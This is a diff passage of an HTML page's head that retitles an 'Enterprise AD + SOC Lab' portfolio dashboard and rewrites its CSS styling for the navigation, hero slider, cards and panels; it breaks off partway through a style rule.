@@ -3,998 +3,870 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Enterprise AD + SOC Lab | Netflix-Style Dashboard</title>
+  <title>Enterprise AD + SOC Lab | Repository-Driven Netflix Dashboard</title>
   <style>
-   :root {
-  --bg: #050b14;
-  --bg-2: #0a1221;
-  --panel: #0f1a2d;
-  --panel-2: #121f36;
-  --line: rgba(168, 198, 255, 0.14);
-  --text: #f4f8ff;
-  --muted: #9eb0cf;
-  --accent: #77adff;
-  --accent-2: #b3d0ff;
-  --shadow: 0 18px 45px rgba(0, 0, 0, 0.42);
-  --max: 1360px;
-  --radius: 24px;
-}
-
-* {
-  box-sizing: border-box;
-}
-
-html {
-  scroll-behavior: smooth;
-}
-
-body {
-  margin: 0;
-  font-family: Inter, "Segoe UI", Roboto, Arial, sans-serif;
-  color: var(--text);
-  background:
-    radial-gradient(circle at top left, rgba(57, 104, 193, 0.22), transparent 24%),
-    radial-gradient(circle at top right, rgba(84, 131, 228, 0.14), transparent 20%),
-    linear-gradient(180deg, #040912 0%, #06101d 24%, #071221 100%);
-  overflow-x: hidden;
-}
-
-body::before {
-  content: "";
-  position: fixed;
-  inset: 0;
-  pointer-events: none;
-  opacity: 0.22;
-  background-image:
-    linear-gradient(rgba(255, 255, 255, 0.025) 1px, transparent 1px),
-    linear-gradient(90deg, rgba(255, 255, 255, 0.025) 1px, transparent 1px);
-  background-size: 42px 42px;
-}
-
-.container {
-  width: min(var(--max), calc(100% - 36px));
-  margin: 0 auto;
-  position: relative;
-  z-index: 1;
-}
-
-/* ==============================
-   NAV
-============================== */
-
-.nav {
-  position: sticky;
-  top: 0;
-  z-index: 50;
-  backdrop-filter: blur(16px);
-  background: linear-gradient(180deg, rgba(4, 10, 18, 0.88), rgba(4, 10, 18, 0.58));
-  border-bottom: 1px solid rgba(255, 255, 255, 0.06);
-}
-
-.nav-inner {
-  width: min(var(--max), calc(100% - 36px));
-  margin: 0 auto;
-  padding: 14px 0;
-  display: flex;
-  justify-content: space-between;
-  align-items: center;
-  gap: 18px;
-}
-
-.brand-wrap {
-  display: flex;
-  align-items: center;
-  gap: 14px;
-  min-width: 0;
-}
-
-.brand-badge {
-  width: 40px;
-  height: 40px;
-  border-radius: 12px;
-  display: grid;
-  place-items: center;
-  background: linear-gradient(180deg, rgba(121, 173, 255, 0.24), rgba(66, 97, 159, 0.2));
-  border: 1px solid rgba(170, 202, 255, 0.16);
-  box-shadow: var(--shadow);
-  font-weight: 800;
-  color: var(--accent-2);
-}
-
-.brand-title {
-  font-weight: 800;
-  letter-spacing: 0.01em;
-  white-space: nowrap;
-}
-
-.brand-sub {
-  color: var(--muted);
-  font-size: 0.84rem;
-  margin-top: 2px;
-}
-
-.nav-links {
-  display: flex;
-  gap: 16px;
-  flex-wrap: wrap;
-  justify-content: flex-end;
-}
-
-.nav-links a {
-  color: var(--muted);
-  text-decoration: none;
-  font-size: 0.94rem;
-  transition: color 0.2s ease;
-}
-
-.nav-links a:hover,
-.nav-links a.active-link {
-  color: var(--text);
-}
-
-/* ==============================
-   HERO
-============================== */
-
-.hero {
-  min-height: 88vh;
-  display: flex;
-  align-items: end;
-  position: relative;
-  overflow: hidden;
-  background:
-    linear-gradient(90deg, rgba(4, 10, 18, 0.95) 0%, rgba(5, 10, 18, 0.8) 38%, rgba(5, 10, 18, 0.34) 66%, rgba(5, 10, 18, 0.18) 100%),
-    radial-gradient(circle at 78% 35%, rgba(89, 139, 230, 0.24), transparent 22%),
-    linear-gradient(180deg, #081221 0%, #0a1628 100%);
-}
-
-.hero::after {
-  display: none;
-}
-
-.hero-inner {
-  display: grid;
-  grid-template-columns: minmax(0, 0.95fr) minmax(340px, 0.85fr);
-  gap: 34px;
-  align-items: stretch;
-  position: relative;
-  z-index: 2;
-}
-
-.hero-content {
-  position: relative;
-  z-index: 2;
-  width: min(760px, 100%);
-  padding: 88px 0 90px;
-}
-
-.hero-showcase {
-  position: relative;
-  z-index: 2;
-  display: flex;
-  align-items: center;
-  padding: 88px 0 90px;
-}
-
-.eyebrow {
-  display: inline-flex;
-  align-items: center;
-  gap: 10px;
-  padding: 8px 14px;
-  border-radius: 999px;
-  font-size: 0.88rem;
-  color: var(--accent-2);
-  background: rgba(118, 167, 255, 0.08);
-  border: 1px solid rgba(168, 198, 255, 0.14);
-  margin-bottom: 18px;
-}
-
-h1 {
-  margin: 0;
-  font-size: clamp(2.4rem, 6vw, 5.4rem);
-  line-height: 0.98;
-  letter-spacing: -0.045em;
-  max-width: 11ch;
-}
-
-.hero p {
-  max-width: 64ch;
-  line-height: 1.75;
-  color: var(--muted);
-  font-size: 1.02rem;
-  margin: 18px 0 26px;
-}
-
-.cta-row {
-  display: flex;
-  gap: 14px;
-  flex-wrap: wrap;
-  margin-bottom: 24px;
-}
-
-.btn {
-  display: inline-flex;
-  align-items: center;
-  justify-content: center;
-  gap: 10px;
-  padding: 14px 20px;
-  border-radius: 14px;
-  text-decoration: none;
-  font-weight: 700;
-  border: 1px solid rgba(170, 202, 255, 0.14);
-  transition: transform 0.2s ease, box-shadow 0.2s ease, border-color 0.2s ease;
-}
-
-.btn:hover {
-  transform: translateY(-2px);
-  border-color: rgba(170, 202, 255, 0.3);
-  box-shadow: var(--shadow);
-}
-
-.btn-primary {
-  background: linear-gradient(180deg, rgba(121, 173, 255, 0.25), rgba(77, 118, 194, 0.18));
-  color: var(--text);
-}
-
-.btn-secondary {
-  background: rgba(255, 255, 255, 0.035);
-  color: var(--text);
-}
-
-.hero-stats {
-  display: flex;
-  gap: 24px;
-  flex-wrap: wrap;
-  color: var(--muted);
-  font-size: 0.94rem;
-}
-
-.hero-stats strong {
-  display: block;
-  color: var(--text);
-  font-size: 1.28rem;
-  margin-bottom: 4px;
-}
-
-/* ==============================
-   HERO CAROUSEL
-============================== */
-
-.hero-carousel-shell {
-  width: 100%;
-  min-height: 520px;
-  border-radius: 30px;
-  border: 1px solid rgba(163, 198, 255, 0.14);
-  background:
-    linear-gradient(180deg, rgba(15, 27, 48, 0.74), rgba(9, 16, 28, 0.92)),
-    radial-gradient(circle at 50% 22%, rgba(124, 172, 255, 0.16), transparent 24%),
-    rgba(255, 255, 255, 0.02);
-  box-shadow: var(--shadow);
-  overflow: hidden;
-  backdrop-filter: blur(12px);
-}
-
-
-
-.hero-slider-head h3 {
-  margin: 0;
-  font-size: 1.02rem;
-  letter-spacing: -0.02em;
-}
-
-.hero-slider-head p {
-  margin: 4px 0 0;
-  font-size: 0.84rem;
-  color: var(--muted);
-  line-height: 1.45;
-}
-
-.hero-carousel {
-  display: grid;
-  grid-template-columns: 52px 1fr 52px;
-  gap: 12px;
-  align-items: center;
-  padding: 18px;
-}
-
-.hero-carousel-viewport {
-  overflow: hidden;
-  width: 100%;
-}
-
-.hero-carousel-track {
-  display: flex;
-  width: 100%;
-  transition: transform 0.4s ease;
-  will-change: transform;
-}
-
-.hero-slide {
-  flex: 0 0 100%;
-  min-width: 100%;
-  min-height: 400px;
-  border-radius: 24px;
-  border: 1px solid rgba(168, 198, 255, 0.12);
-  background:
-    linear-gradient(180deg, rgba(17, 28, 48, 0.78), rgba(9, 16, 28, 0.96)),
-    radial-gradient(circle at top left, rgba(94, 140, 228, 0.18), transparent 34%);
-  box-shadow: var(--shadow);
-  overflow: hidden;
-  display: flex;
-  flex-direction: column;
-}
-
-.hero-slide-media {
-  height: 170px;
-  position: relative;
-  background:
-    linear-gradient(180deg, rgba(6, 10, 18, 0.08), rgba(6, 10, 18, 0.48)),
-    radial-gradient(circle at 50% 18%, rgba(124, 172, 255, 0.24), transparent 26%),
-    linear-gradient(135deg, #16223a, #0b1220);
-}
-
-.hero-slide-media::after {
-  content: "";
-  position: absolute;
-  inset: 0;
-  background-image:
-    linear-gradient(rgba(255, 255, 255, 0.03) 1px, transparent 1px),
-    linear-gradient(90deg, rgba(255, 255, 255, 0.03) 1px, transparent 1px);
-  background-size: 24px 24px;
-  opacity: 0.28;
-}
-
-.hero-slide-badge {
-  position: absolute;
-  left: 16px;
-  top: 16px;
-  z-index: 2;
-  padding: 8px 12px;
-  border-radius: 999px;
-  font-size: 0.76rem;
-  color: var(--accent-2);
-  background: rgba(118, 167, 255, 0.1);
-  border: 1px solid rgba(168, 198, 255, 0.14);
-}
-
-.hero-slide-body {
-  padding: 18px;
-  display: flex;
-  flex-direction: column;
-  gap: 12px;
-  flex: 1;
-}
-
-.hero-slide-body h4 {
-  margin: 0;
-  font-size: 1.18rem;
-  letter-spacing: -0.02em;
-}
-
-.hero-slide-body p {
-  margin: 0;
-  color: var(--muted);
-  line-height: 1.65;
-  font-size: 0.95rem;
-  max-width: none;
-}
-
-.hero-slide-tags {
-  display: flex;
-  flex-wrap: wrap;
-  gap: 8px;
-}
-
-.hero-slide-list {
-  margin: 0;
-  padding-left: 18px;
-  color: var(--muted);
-  line-height: 1.65;
-  font-size: 0.92rem;
-}
-
-.hero-carousel-btn {
-  width: 52px;
-  height: 52px;
-  border-radius: 50%;
-  border: 1px solid rgba(168, 198, 255, 0.14);
-  background: rgba(255, 255, 255, 0.04);
-  color: var(--text);
-  font-size: 1.8rem;
-  cursor: pointer;
-  transition: background 0.2s ease, transform 0.2s ease;
-}
-
-.hero-carousel-btn:hover {
-  background: rgba(255, 255, 255, 0.08);
-  transform: scale(1.04);
-}
-
-.hero-carousel-dots {
-  display: flex;
-  justify-content: center;
-  gap: 10px;
-  padding: 0 18px 20px;
-}
-
-.hero-carousel-dots button {
-  width: 10px;
-  height: 10px;
-  border-radius: 50%;
-  border: 0;
-  background: rgba(179, 208, 255, 0.28);
-  cursor: pointer;
-}
-
-.hero-carousel-dots button.is-active {
-  background: rgba(179, 208, 255, 0.95);
-}
-
-/* ==============================
-   SECTIONS
-============================== */
-
-section {
-  padding: 28px 0;
-}
-
-.section-head {
-  display: flex;
-  justify-content: space-between;
-  align-items: end;
-  gap: 18px;
-  margin-bottom: 16px;
-}
-
-.section-head h2 {
-  margin: 0;
-  font-size: clamp(1.3rem, 2.4vw, 2rem);
-  letter-spacing: -0.03em;
-}
-
-.section-head p {
-  margin: 0;
-  color: var(--muted);
-  max-width: 60ch;
-  line-height: 1.65;
-}
-
-/* ==============================
-   CONTENT SCROLLERS
-============================== */
-
-.row-wrap {
-  position: relative;
-}
-
-.scroller {
-  display: grid;
-  grid-auto-flow: column;
-  grid-auto-columns: minmax(280px, 340px);
-  gap: 18px;
-  overflow-x: auto;
-  padding-bottom: 12px;
-  scroll-snap-type: x proximity;
-  scrollbar-width: thin;
-}
-
-.scroller::-webkit-scrollbar {
-  height: 10px;
-}
-
-.scroller::-webkit-scrollbar-thumb {
-  background: rgba(153, 190, 255, 0.16);
-  border-radius: 999px;
-}
-
-/* ==============================
-   CARDS
-============================== */
-
-.card {
-  position: relative;
-  min-height: 220px;
-  border-radius: var(--radius);
-  overflow: visible;
-  border: 1px solid rgba(168, 198, 255, 0.12);
-  background:
-    linear-gradient(180deg, rgba(17, 28, 48, 0.78), rgba(9, 16, 28, 0.96)),
-    radial-gradient(circle at top left, rgba(94, 140, 228, 0.24), transparent 34%);
-  box-shadow: var(--shadow);
-  scroll-snap-align: start;
-  transition: transform 0.28s ease, border-color 0.28s ease, box-shadow 0.28s ease;
-  isolation: isolate;
-  text-decoration: none;
-  color: inherit;
-}
-
-.card:hover {
-  transform: translateY(-8px) scale(1.02);
-  border-color: rgba(168, 198, 255, 0.3);
-  box-shadow: 0 24px 55px rgba(0, 0, 0, 0.52);
-  z-index: 10;
-}
-
-.card-media {
-  height: 140px;
-  background:
-    linear-gradient(180deg, rgba(6, 10, 18, 0.08), rgba(6, 10, 18, 0.45)),
-    radial-gradient(circle at 20% 15%, rgba(124, 172, 255, 0.28), transparent 26%),
-    linear-gradient(135deg, #16223a, #0b1220);
-  position: relative;
-}
-
-.card-media::after {
-  content: "";
-  position: absolute;
-  inset: 0;
-  background-image:
-    linear-gradient(rgba(255, 255, 255, 0.03) 1px, transparent 1px),
-    linear-gradient(90deg, rgba(255, 255, 255, 0.03) 1px, transparent 1px);
-  background-size: 24px 24px;
-  opacity: 0.3;
-}
-
-.play {
-  position: absolute;
-  left: 18px;
-  top: 18px;
-  width: 54px;
-  height: 54px;
-  border-radius: 50%;
-  display: grid;
-  place-items: center;
-  background: rgba(248, 251, 255, 0.92);
-  color: #08101b;
-  font-size: 1.2rem;
-  font-weight: 800;
-  z-index: 2;
-}
-
-.card-body {
-  position: relative;
-  z-index: 2;
-  padding: 16px 18px 18px 18px;
-  min-height: 220px;
-  display: flex;
-  flex-direction: column;
-  justify-content: flex-start;
-}
-
-.meta {
-  display: flex;
-  gap: 8px;
-  flex-wrap: wrap;
-  margin-bottom: 10px;
-}
-
-.pill {
-  display: inline-flex;
-  padding: 6px 10px;
-  border-radius: 999px;
-  font-size: 0.74rem;
-  color: var(--accent-2);
-  background: rgba(118, 167, 255, 0.08);
-  border: 1px solid rgba(168, 198, 255, 0.12);
-}
-
-.card h3 {
-  margin: 0 0 8px;
-  font-size: 1.14rem;
-}
-
-.card p {
-  margin: 0;
-  max-width: 28ch;
-  color: var(--muted);
-  line-height: 1.65;
-  font-size: 0.95rem;
-}
-
-.card:focus-visible {
-  outline: 2px solid rgba(179, 208, 255, 0.9);
-  outline-offset: 3px;
-}
-
-/* ==============================
-   PANELS / TIMELINE
-============================== */
-
-.highlight-grid {
-  display: grid;
-  grid-template-columns: 1.2fr 0.8fr;
-  gap: 20px;
-  margin-top: 16px;
-}
-
-.panel {
-  border-radius: var(--radius);
-  padding: 22px;
-  background: linear-gradient(180deg, rgba(15, 26, 45, 0.88), rgba(10, 18, 31, 0.96));
-  border: 1px solid rgba(168, 198, 255, 0.12);
-  box-shadow: var(--shadow);
-}
-
-.timeline {
-  display: grid;
-  gap: 14px;
-}
-
-.step {
-  display: grid;
-  grid-template-columns: 46px 1fr;
-  gap: 14px;
-  align-items: start;
-}
-
-.step-num {
-  width: 46px;
-  height: 46px;
-  border-radius: 14px;
-  display: grid;
-  place-items: center;
-  font-weight: 800;
-  color: var(--text);
-  background: rgba(118, 167, 255, 0.12);
-  border: 1px solid rgba(168, 198, 255, 0.12);
-}
-
-.step h3,
-.panel h3 {
-  margin: 0 0 8px;
-  font-size: 1.08rem;
-}
-
-.step p,
-.panel p,
-.panel li {
-  margin: 0;
-  color: var(--muted);
-  line-height: 1.68;
-}
-
-.terminal {
-  margin-top: 14px;
-  background: rgba(3, 8, 16, 0.88);
-  border: 1px solid rgba(168, 198, 255, 0.12);
-  border-radius: 18px;
-  padding: 16px;
-  font-family: Consolas, Monaco, monospace;
-  line-height: 1.8;
-  color: #dce8ff;
-  font-size: 0.92rem;
-}
-
-.prompt {
-  color: #89b6ff;
-}
-
-.cmd {
-  color: #fff;
-}
-
-/* ==============================
-   SAMPLE FRAMES
-============================== */
-
-.frame-grid {
-  display: grid;
-  grid-template-columns: 1fr 1fr;
-  gap: 14px;
-  margin-top: 16px;
-}
-
-.sample-frame {
-  min-height: 150px;
-  border-radius: 18px;
-  border: 1px solid rgba(168, 198, 255, 0.12);
-  background:
-    linear-gradient(180deg, rgba(8, 14, 24, 0.18), rgba(8, 14, 24, 0.96)),
-    radial-gradient(circle at top left, rgba(124, 172, 255, 0.22), transparent 34%),
-    linear-gradient(135deg, #101a2d, #09111e);
-  box-shadow: var(--shadow);
-  overflow: hidden;
-}
-
-.sample-frame-head {
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-  gap: 10px;
-  padding: 12px 14px;
-  border-bottom: 1px solid rgba(168, 198, 255, 0.1);
-  color: var(--accent-2);
-  font-size: 0.84rem;
-}
-
-.sample-dots {
-  display: flex;
-  gap: 6px;
-}
-
-.sample-dots span {
-  width: 8px;
-  height: 8px;
-  border-radius: 50%;
-  background: rgba(179, 208, 255, 0.45);
-}
-
-.sample-frame-body {
-  padding: 14px;
-  color: var(--muted);
-  line-height: 1.6;
-  font-size: 0.92rem;
-}
-
-.sample-bars {
-  display: grid;
-  gap: 8px;
-}
-
-.sample-bars span {
-  display: block;
-  height: 10px;
-  border-radius: 999px;
-  background: linear-gradient(90deg, rgba(124, 172, 255, 0.34), rgba(124, 172, 255, 0.08));
-}
-
-.sample-bars span:nth-child(1) { width: 92%; }
-.sample-bars span:nth-child(2) { width: 74%; }
-.sample-bars span:nth-child(3) { width: 84%; }
-.sample-bars span:nth-child(4) { width: 58%; }
-
-/* ==============================
-   GALLERY
-============================== */
-
-.gallery {
-  display: grid;
-  grid-template-columns: repeat(4, 1fr);
-  gap: 16px;
-  margin-top: 16px;
-}
-
-.shot {
-  min-height: 170px;
-  border-radius: 20px;
-  overflow: hidden;
-  border: 1px solid rgba(168, 198, 255, 0.12);
-  background:
-    linear-gradient(180deg, rgba(8, 14, 24, 0.18), rgba(8, 14, 24, 0.94)),
-    radial-gradient(circle at top left, rgba(124, 172, 255, 0.24), transparent 34%),
-    linear-gradient(135deg, #121f36, #0a1221);
-  box-shadow: var(--shadow);
-  display: flex;
-  align-items: end;
-  padding: 16px;
-  color: var(--text);
-  position: relative;
-  cursor: pointer;
-}
-
-.shot::before {
-  content: "Preview";
-  position: absolute;
-  top: 12px;
-  right: 12px;
-  padding: 5px 9px;
-  border-radius: 999px;
-  font-size: 0.72rem;
-  color: var(--accent-2);
-  background: rgba(118, 167, 255, 0.1);
-  border: 1px solid rgba(168, 198, 255, 0.12);
-}
-
-.shot-label {
-  position: relative;
-  z-index: 1;
-}
-
-/* ==============================
-   MODAL
-============================== */
-
-.modal {
-  position: fixed;
-  inset: 0;
-  z-index: 120;
-  display: none;
-  align-items: center;
-  justify-content: center;
-  padding: 20px;
-  background: rgba(3, 7, 14, 0.78);
-  backdrop-filter: blur(10px);
-}
-
-.modal.is-open {
-  display: flex;
-}
-
-.modal-dialog {
-  width: min(920px, 100%);
-  max-height: 88vh;
-  overflow: auto;
-  border-radius: 24px;
-  border: 1px solid rgba(168, 198, 255, 0.14);
-  background: linear-gradient(180deg, rgba(14, 24, 41, 0.98), rgba(7, 12, 22, 0.99));
-  box-shadow: 0 28px 70px rgba(0, 0, 0, 0.58);
-}
-
-.modal-hero {
-  height: 240px;
-  border-bottom: 1px solid rgba(168, 198, 255, 0.1);
-  background:
-    linear-gradient(180deg, rgba(8, 14, 24, 0.1), rgba(8, 14, 24, 0.82)),
-    radial-gradient(circle at top left, rgba(124, 172, 255, 0.26), transparent 30%),
-    linear-gradient(135deg, #16223a, #0b1220);
-}
-
-.modal-content {
-  padding: 22px;
-}
-
-.modal-top {
-  display: flex;
-  justify-content: space-between;
-  gap: 12px;
-  align-items: start;
-  margin-bottom: 14px;
-}
-
-.modal-close {
-  width: 42px;
-  height: 42px;
-  border-radius: 12px;
-  border: 1px solid rgba(168, 198, 255, 0.14);
-  background: rgba(255, 255, 255, 0.04);
-  color: var(--text);
-  font-size: 1.1rem;
-  cursor: pointer;
-}
-
-.modal-close:hover {
-  background: rgba(255, 255, 255, 0.08);
-}
-
-.modal-meta {
-  display: flex;
-  flex-wrap: wrap;
-  gap: 8px;
-  margin: 12px 0 16px;
-}
-
-.modal-layout {
-  display: grid;
-  grid-template-columns: 1.15fr 0.85fr;
-  gap: 18px;
-}
-
-.modal-card {
-  cursor: pointer;
-}
-
-.modal-side {
-  border-radius: 18px;
-  border: 1px solid rgba(168, 198, 255, 0.12);
-  background: rgba(255, 255, 255, 0.03);
-  padding: 16px;
-}
-
-.modal-side h4 {
-  margin: 0 0 10px;
-  font-size: 1rem;
-}
-
-.modal-side ul {
-  margin: 0;
-  padding-left: 18px;
-  color: var(--muted);
-  line-height: 1.7;
-}
-
-/* ==============================
-   FOOTER
-============================== */
-
-.footer {
-  padding: 32px 0 54px;
-  text-align: center;
-  color: var(--muted);
-  font-size: 0.92rem;
-}
-
-/* ==============================
-   RESPONSIVE
-============================== */
-
-@media (max-width: 1100px) {
-  .hero-inner {
-    grid-template-columns: 1fr;
-  }
-
-  .hero-showcase {
-    padding-top: 0;
-  }
-
-  .hero-carousel-shell {
-    min-height: 0;
-  }
-}
-
-@media (max-width: 1020px) {
-  .highlight-grid,
-  .gallery,
-  .frame-grid,
-  .modal-layout {
-    grid-template-columns: 1fr 1fr;
-  }
-}
-
-@media (max-width: 760px) {
-  .nav-inner,
-  .section-head {
-    display: block;
-  }
-
-  .nav-links {
-    margin-top: 12px;
-    justify-content: flex-start;
-  }
-
-  .hero {
-    min-height: auto;
-  }
-
-  .hero-content {
-    padding: 52px 0 54px;
-  }
-
-  .hero-carousel {
-    grid-template-columns: 1fr;
-  }
-
-  .hero-carousel-btn {
-    display: none;
-  }
-
-  .hero-slide {
-    min-height: 0;
-  }
-
-  .highlight-grid,
-  .gallery,
-  .frame-grid,
-  .modal-layout {
-    grid-template-columns: 1fr;
-  }
-
-  .modal {
-    padding: 10px;
-  }
-
-  .modal-dialog {
-    width: calc(100vw - 8px);
-    max-height: 92vh;
-  }
-
-  .modal-hero {
-    height: 170px;
-  }
-}
-
-@media (prefers-reduced-motion: reduce) {
-  *,
-  *::before,
-  *::after {
-    animation: none !important;
-    transition: none !important;
-    scroll-behavior: auto !important;
-  }
-}
-.hero::after {
-  display: none;
-}
-	
+    :root {
+      --bg: #050b14;
+      --bg-2: #0a1221;
+      --panel: #0f1a2d;
+      --panel-2: #121f36;
+      --line: rgba(168, 198, 255, 0.14);
+      --text: #f4f8ff;
+      --muted: #9eb0cf;
+      --accent: #77adff;
+      --accent-2: #b3d0ff;
+      --shadow: 0 18px 45px rgba(0, 0, 0, 0.42);
+      --max: 1360px;
+      --radius: 24px;
+    }
+
+    * { box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
+
+    body {
+      margin: 0;
+      font-family: Inter, Segoe UI, Roboto, Arial, sans-serif;
+      color: var(--text);
+      background:
+        radial-gradient(circle at top left, rgba(57, 104, 193, 0.22), transparent 24%),
+        radial-gradient(circle at top right, rgba(84, 131, 228, 0.14), transparent 20%),
+        linear-gradient(180deg, #040912 0%, #06101d 24%, #071221 100%);
+      overflow-x: hidden;
+    }
+
+    body::before {
+      content: "";
+      position: fixed;
+      inset: 0;
+      pointer-events: none;
+      opacity: 0.22;
+      background-image:
+        linear-gradient(rgba(255,255,255,0.025) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(255,255,255,0.025) 1px, transparent 1px);
+      background-size: 42px 42px;
+    }
+
+    .container {
+      width: min(var(--max), calc(100% - 36px));
+      margin: 0 auto;
+      position: relative;
+      z-index: 1;
+    }
+
+    .nav {
+      position: sticky;
+      top: 0;
+      z-index: 80;
+      backdrop-filter: blur(16px);
+      background: linear-gradient(180deg, rgba(4,10,18,0.88), rgba(4,10,18,0.58));
+      border-bottom: 1px solid rgba(255,255,255,0.06);
+    }
+
+    .nav-inner {
+      width: min(var(--max), calc(100% - 36px));
+      margin: 0 auto;
+      padding: 14px 0;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 18px;
+    }
+
+    .brand-wrap {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      min-width: 0;
+    }
+
+    .brand-badge {
+      width: 58px;
+      height: 58px;
+      border-radius: 18px;
+      display: grid;
+      place-items: center;
+      background: linear-gradient(180deg, rgba(121, 173, 255, 0.24), rgba(66, 97, 159, 0.2));
+      border: 1px solid rgba(170, 202, 255, 0.16);
+      box-shadow: var(--shadow);
+      font-weight: 800;
+      color: var(--accent-2);
+      font-size: 1.6rem;
+    }
+
+    .brand-title {
+      font-weight: 800;
+      letter-spacing: 0.01em;
+      white-space: nowrap;
+      font-size: 1.1rem;
+    }
+
+    .brand-sub {
+      color: var(--muted);
+      font-size: 0.84rem;
+      margin-top: 2px;
+    }
+
+    .nav-links {
+      display: flex;
+      gap: 16px;
+      flex-wrap: wrap;
+      justify-content: flex-end;
+    }
+
+    .nav-links a {
+      color: var(--muted);
+      text-decoration: none;
+      font-size: 0.94rem;
+    }
+
+    .nav-links a:hover,
+    .nav-links a.active-link {
+      color: var(--text);
+    }
+
+    .hero {
+      min-height: 88vh;
+      display: flex;
+      align-items: end;
+      position: relative;
+      overflow: hidden;
+      background:
+        linear-gradient(90deg, rgba(4,10,18,0.95) 0%, rgba(5,10,18,0.8) 38%, rgba(5,10,18,0.34) 66%, rgba(5,10,18,0.18) 100%),
+        radial-gradient(circle at 78% 35%, rgba(89, 139, 230, 0.18), transparent 22%),
+        linear-gradient(180deg, #081221 0%, #0a1628 100%);
+    }
+
+    .hero::after {
+      display: none;
+    }
+
+    .hero-inner {
+      display: grid;
+      grid-template-columns: minmax(0, 0.95fr) minmax(360px, 0.85fr);
+      gap: 34px;
+      align-items: stretch;
+      position: relative;
+      z-index: 2;
+    }
+
+    .hero-content {
+      position: relative;
+      z-index: 2;
+      width: min(760px, 100%);
+      padding: 88px 0 90px;
+    }
+
+    .hero-showcase {
+      position: relative;
+      z-index: 2;
+      display: flex;
+      align-items: center;
+      padding: 88px 0 90px;
+    }
+
+    .eyebrow {
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      padding: 8px 14px;
+      border-radius: 999px;
+      font-size: 0.88rem;
+      color: var(--accent-2);
+      background: rgba(118, 167, 255, 0.08);
+      border: 1px solid rgba(168, 198, 255, 0.14);
+      margin-bottom: 18px;
+    }
+
+    h1 {
+      margin: 0;
+      font-size: clamp(2.5rem, 6vw, 5.6rem);
+      line-height: 0.98;
+      letter-spacing: -0.045em;
+      max-width: 11ch;
+    }
+
+    .hero p {
+      max-width: 64ch;
+      line-height: 1.75;
+      color: var(--muted);
+      font-size: 1.02rem;
+      margin: 18px 0 26px;
+    }
+
+    .cta-row {
+      display: flex;
+      gap: 14px;
+      flex-wrap: wrap;
+      margin-bottom: 24px;
+    }
+
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      padding: 14px 20px;
+      border-radius: 14px;
+      text-decoration: none;
+      font-weight: 700;
+      border: 1px solid rgba(170, 202, 255, 0.14);
+      transition: transform 0.2s ease, box-shadow 0.2s ease, border-color 0.2s ease;
+    }
+
+    .btn:hover {
+      transform: translateY(-2px);
+      border-color: rgba(170, 202, 255, 0.3);
+      box-shadow: var(--shadow);
+    }
+
+    .btn-primary {
+      background: linear-gradient(180deg, rgba(121, 173, 255, 0.25), rgba(77, 118, 194, 0.18));
+      color: var(--text);
+    }
+
+    .btn-secondary {
+      background: rgba(255,255,255,0.035);
+      color: var(--text);
+    }
+
+    .hero-stats {
+      display: flex;
+      gap: 24px;
+      flex-wrap: wrap;
+      color: var(--muted);
+      font-size: 0.94rem;
+    }
+
+    .hero-stats strong {
+      display: block;
+      color: var(--text);
+      font-size: 1.28rem;
+      margin-bottom: 4px;
+    }
+
+    .pill {
+      display: inline-flex;
+      padding: 6px 10px;
+      border-radius: 999px;
+      font-size: 0.74rem;
+      color: var(--accent-2);
+      background: rgba(118, 167, 255, 0.08);
+      border: 1px solid rgba(168, 198, 255, 0.12);
+    }
+
+    .hero-slider-shell {
+      width: 100%;
+      min-height: 520px;
+      border-radius: 30px;
+      border: 1px solid rgba(163, 198, 255, 0.14);
+      background:
+        linear-gradient(180deg, rgba(15, 27, 48, 0.74), rgba(9, 16, 28, 0.92)),
+        radial-gradient(circle at 50% 22%, rgba(124, 172, 255, 0.16), transparent 24%),
+        rgba(255,255,255,0.02);
+      box-shadow: var(--shadow);
+      overflow: hidden;
+      backdrop-filter: blur(12px);
+    }
+
+    .hero-slider-head {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 14px;
+      padding: 18px 20px;
+      border-bottom: 1px solid rgba(168, 198, 255, 0.1);
+      background: linear-gradient(180deg, rgba(255,255,255,0.03), rgba(255,255,255,0.01));
+    }
+
+    .hero-slider-head h3 {
+      margin: 0;
+      font-size: 1.02rem;
+      letter-spacing: -0.02em;
+    }
+
+    .hero-slider-head p {
+      margin: 4px 0 0;
+      font-size: 0.84rem;
+      color: var(--muted);
+      line-height: 1.45;
+    }
+
+    .hero-slider-track {
+      display: grid;
+      grid-auto-flow: column;
+      grid-auto-columns: minmax(260px, 320px);
+      gap: 16px;
+      overflow-x: auto;
+      padding: 18px 18px 22px;
+      scroll-snap-type: x proximity;
+      scrollbar-width: thin;
+      min-height: calc(520px - 78px);
+      align-content: start;
+    }
+
+    .hero-slider-track::-webkit-scrollbar,
+    .scroller::-webkit-scrollbar {
+      height: 10px;
+    }
+
+    .hero-slider-track::-webkit-scrollbar-thumb,
+    .scroller::-webkit-scrollbar-thumb {
+      background: rgba(153, 190, 255, 0.16);
+      border-radius: 999px;
+    }
+
+    .hero-slide {
+      scroll-snap-align: start;
+      min-height: 420px;
+      border-radius: 24px;
+      border: 1px solid rgba(168, 198, 255, 0.12);
+      background:
+        linear-gradient(180deg, rgba(17, 28, 48, 0.78), rgba(9, 16, 28, 0.96)),
+        radial-gradient(circle at top left, rgba(94, 140, 228, 0.18), transparent 34%);
+      box-shadow: var(--shadow);
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .hero-slide-media {
+      height: 170px;
+      position: relative;
+      background:
+        linear-gradient(180deg, rgba(6, 10, 18, 0.08), rgba(6, 10, 18, 0.48)),
+        radial-gradient(circle at 50% 18%, rgba(124, 172, 255, 0.24), transparent 26%),
+        linear-gradient(135deg, #16223a, #0b1220);
+    }
+
+    .hero-slide-media::after,
+    .card-media::after {
+      content: "";
+      position: absolute;
+      inset: 0;
+      background-image:
+        linear-gradient(rgba(255,255,255,0.03) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(255,255,255,0.03) 1px, transparent 1px);
+      background-size: 24px 24px;
+      opacity: 0.28;
+    }
+
+    .hero-slide-badge {
+      position: absolute;
+      left: 16px;
